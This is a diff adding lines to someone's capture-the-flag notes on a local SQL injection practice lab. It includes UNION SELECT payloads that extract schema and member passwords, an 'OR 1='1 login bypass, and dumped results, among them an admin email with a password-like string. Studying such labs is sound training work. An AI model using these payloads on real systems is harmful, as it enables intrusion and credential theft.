@@ -160,7 +160,30 @@ CTF NOTES--------------------------------------------------
 
 http://127.0.0.1:11201/cases/productsCategory.php?category=1%20UNION%20SELECT%20table_schema,column_name,table_name%20from%20information_schema.columns
 
+category=1 UNION SELECT id,username,password from sqlinjection.members
+
 username=%27OR+1%3D%271&password=%27OR+1%3D%271&submit=Login
+username=%27OR+1%3D%271&password=%27OR+1%3D%271&submit=Login
+
+{ 4nGfU ! 87s2V }
+
+CSM Gene Vandenham
+
+admin@website.com	Boss	NQGuZj3xNckuVE8d45rx
+
+sqlinjection	id	share4
+sqlinjection	comment	share4
+sqlinjection	mime	share4
+sqlinjection	data	share4
+
+id,mime,data
+id,comment,mime
+
+You need to extract file from @@database.	2	3.00
+Keys to the Kingdom	2	3.00
+
+INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('wr', 'gr', 'grg', 'r', 'rg', 3) 
+
 
 
 
